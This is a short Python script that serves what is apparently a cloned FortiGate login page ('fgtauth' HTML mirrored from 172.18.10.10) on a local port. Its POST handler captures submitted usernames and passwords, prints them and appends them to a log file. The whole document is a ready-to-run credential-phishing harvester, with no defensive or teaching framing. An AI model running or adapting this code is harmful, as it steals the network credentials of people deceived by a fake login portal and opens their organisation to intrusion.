import http.server
import socketserver
import os
import urllib

PORT = 8000  # The port you want to use for hosting
HTML_FILE = "fgtauth_70a7607c3738c29f.html"  # The HTML file you want to host
LOG_FILE = "log.txt"

# Change the directory to the folder containing your HTML file
DIRECTORY = "./site folder/172.18.10.10/"
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = HTML_FILE
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = urllib.parse.parse_qs(post_data)
        input1 = form_data.get('username', [''])[0]
        input2 = form_data.get('password', [''])[0]
        print('username:', input1)
        print('password:', input2)
        
        log_data = f"Username: {input1}\nPassword: {input2}\n\n"

        with open(LOG_FILE, 'a') as file:
            file.write(log_data)



# Set the directory to serve files from
os.chdir(DIRECTORY)

# Start a local server
with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    print(f"Server started at port {PORT}")
    print(f"Hosting '{HTML_FILE}' at http://localhost:{PORT}/")

    # Serve the HTML files indefinitely until interrupted
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

httpd.server_close()
print("Server stopped")
